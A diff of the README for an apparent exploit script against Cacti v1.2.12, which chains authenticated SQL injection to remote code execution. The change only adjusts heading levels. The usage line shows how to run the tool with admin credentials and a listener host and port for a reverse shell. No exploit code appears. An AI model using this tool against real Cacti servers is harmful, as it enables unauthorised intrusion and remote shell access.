@@ -1,11 +1,11 @@
 # Cacti v1.2.12 Authenticated Remote Code Execution     
 # (SQLI --> RCE)
 
-<h1> Discovery : https://github.com/Cacti/cacti/issues/3622 </h1>
+<h3> Discovery : https://github.com/Cacti/cacti/issues/3622 </h3>
 
 
-<h2> Usage : </h2>
-<h3>python3 cacti_rce.py cacti_rce.py -H http://cactiurl -U `ADMIN USERNAME` -P `ADMIN PASSWORD` -l `LHOST` -p `LPORT` </h3>
+<h4> Usage : </h4>
+<h4>python3 cacti_rce.py cacti_rce.py -H http://cactiurl -U `ADMIN USERNAME` -P `ADMIN PASSWORD` -l `LHOST` -p `LPORT` </h4>
   
 <br>
 usage: cacti_rce.py [-h] [-H H] [-U U] [-P P] [-l L] [-p P]
